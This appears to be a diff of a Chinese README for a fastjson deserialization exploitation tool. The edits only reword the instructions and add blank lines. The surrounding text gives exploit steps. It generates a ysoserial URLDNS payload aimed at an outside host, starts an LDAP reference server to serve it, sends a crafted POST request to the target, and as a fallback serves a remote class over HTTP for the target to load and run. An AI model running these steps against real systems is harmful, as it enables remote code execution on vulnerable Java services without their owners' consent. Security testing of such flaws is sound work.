@@ -20,10 +20,12 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 
 ladp:
-1. 用下面命令生成base64的测试语句
+1. 用下面命令生成base64编码过的测试语句
 java -jar ysoserial6.jar URLDNS 'http://wyzxxz.cn'|base64 > base64_payload_file
+
 2. 启动LDAP服务
 java -cp fastjson_tool.jar LDAPRefServer2 8888  base64_payload_file
+
 3. 发送请求包
 POST /test HTTP/1.1
 Host: 127.0.0.1
@@ -39,7 +41,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 else:
 有些环境可能利用不成功，可以尝试默认的攻击方法,
-例如，启动ldap服务，从获取http服务恶意class
+例如，启动ldap服务，从获取http服务class
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
 ```
